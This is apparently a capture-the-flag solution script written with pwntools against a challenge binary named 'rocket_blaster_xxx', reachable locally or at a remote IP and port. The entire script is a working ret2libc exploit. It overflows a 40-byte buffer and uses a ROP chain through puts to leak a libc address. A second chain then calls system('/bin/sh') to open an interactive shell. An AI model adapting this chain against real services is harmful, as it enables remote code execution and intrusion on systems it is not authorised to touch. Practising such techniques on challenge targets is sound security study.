from pwn import *

if args.LOCAL:
    io = process('./rocket_blaster_xxx')
    if args.GDB:
        cmd = """

        """
        gdb.attach(io, cmd)
else:
    io =remote('94.237.53.3', 46681)
elf=ELF('./rocket_blaster_xxx')
libc=ELF('./glibc/libc.so.6')

pop_rdi =0x000000000040159f
pop_rsi = 0x000000000040159d
pop_rdx = 0x000000000040159b
pause()
pl = b'A'*40+ p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(0x00000000004014FA)
io.send(pl)
io.recvuntil(b'\nPreparing beta testing..\n')
libc.address = u64(io.recv(6)+b'\0\0') - libc.sym.puts
print(hex(libc.address))
pl = b'A'*40+ p64(pop_rdi+1) +p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system) + p64(0x00000000004014FA)
io.send(pl)
io.interactive()
